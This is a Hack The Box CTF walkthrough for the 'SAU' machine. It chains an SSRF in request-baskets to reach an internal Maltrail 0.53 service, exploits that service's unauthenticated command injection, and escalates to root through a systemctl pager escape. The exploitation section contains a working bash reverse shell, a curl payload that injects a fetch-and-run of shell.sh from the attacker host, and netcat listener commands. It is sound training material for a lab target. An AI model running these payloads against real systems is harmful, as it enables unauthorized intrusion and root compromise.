# SAU
While playing SAU from Hack The Box, I encountered a host with open ports and filtered access points, leading me to a web service on port 55555. A meticulous reconnaissance revealed a basket collection application powered by `request-baskets`. Exploiting a cross-site request forgery vulnerability, I gained access to an internal site running Maltrail. A subsequent dive into version-specific vulnerabilities exposed an unauthenticated remote code execution flaw in Maltrail 0.53. Successful exploitation provided a foothold to escalate privileges, exploiting an intriguing interaction with `systemctl` that eventually led to root access. This CTF machine showcased a blend of web application security, version-specific exploits, and clever privilege escalation techniques.

## Reconnaissance
I initiated my reconnaissance by conducting a port scan using `nmap`. I executed two scans: the first quickly enumerated open ports, while the second utilized `nse` scripts provided by `nmap`.

```
nmap -p- --min-rate 1000 -oN allPorts.nmap 10.10.11.224

```

The output revealed that ports 22 and 55555 were open, while ports 80 and 8338 were filtered. My assumption is that a host firewall permits access only internally. Port 22 seems to be for SSH, while port 55555 appears to host a website.

Given the lower attack surface of SSH compared to a web server, I decided to focus my enumeration on port 55555.

## HTTP TCP/55555

Upon visiting the site, I was redirected to `/web`, revealing a basket collection application.
![sau](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/sau/1.png)

The footer indicated that the site was powered by `request-baskets`. Further investigation on GitHub explained its functionality - creating baskets to capture and inspect HTTP requests via UI or API.

A version check revealed the software version 1.2.1, and a quick Google search unveiled a [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163) vulnerability, a cross-site request forgery issue.

Exploiting this vulnerability was straightforward. By creating a new basket and configuring the forward URL to `localhost:80`, we gained access to the internal site running on port 80. When a request was made to the basket it can be configured to forward that request some place else, like its internally running website.

A test on a blank basket returned nothing, while applying the forward URL yielded a response related to a project called Maltrail.

![sau](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/sau/2.png)
![sau](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/sau/3.png)

Maltrail, found on [GitHub](https://github.com/stamparm/maltrail/), is designed to detect malicious traffic. The response contained version information:
```
<div class="bottom noselect">Powered by <b>M</b>altrail (v<b>0.53</b>)</div>
```

Further research on Maltrail version 0.53 uncovered an unauthenticated remote code execution (RCE) exploit detailed on [Huntr](https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/). 

To exploit this, I modified the forward URL to `http://127.0.0.1/login` and hosted a reverse shell on a Python3 web server. Executing the payload successfully granted code execution on the internal site.

![sau](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/sau/4.png)

```
sudo python3 -m http.server 80
nc -lvnp 9001
```

```
#!/bin/bash
sh -i >& /dev/tcp/10.10.14.4/9001 0>&1
```

```
curl http://10.10.11.224:55555/zon --data 'username=;`curl 10.10.14.4:80/shell.sh|bash`'
```

This will make a request to the basket, the basket will then forward the request to the internal webserver running maltrail giving code execution. If everything went right there will be a request to the python3 server getting the shell script, then a connection back on netcat.

## Privilege Escalation
The obtained shell had limited capabilities, so I performed the classic Python3 upgrade: `python3 -c 'import pty; pty.spawn("/bin/bash")'`.

Exploring my access, I discovered that I had sudo privileges to run `systemctl` on `trail.service`.
```
puma@sau:/opt/maltrail$ sudo -l

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
puma@sau:/opt/maltrail$ 
```

Executing this command led to an interesting situation where it prompted me to press enter, there are some scenarios where running `!/bin/bash` drops into a root console. Surprisingly, it worked!
```
puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!/bin/bash
!//bbiinn//bbaasshh!/bin/bash
root@sau:/opt/maltrail# id
id
uid=0(root) gid=0(root) groups=0(root)
root@sau:/opt/maltrail# 
```

This trick also works on a full tty shell if the window is small enough. The issue stems from the LESSSECURE environment variable not being set to 1, identified as CVE-2023â€“26604 with systemd 245. A patch prevents commands from being executed if the effective UID is different from the UID.
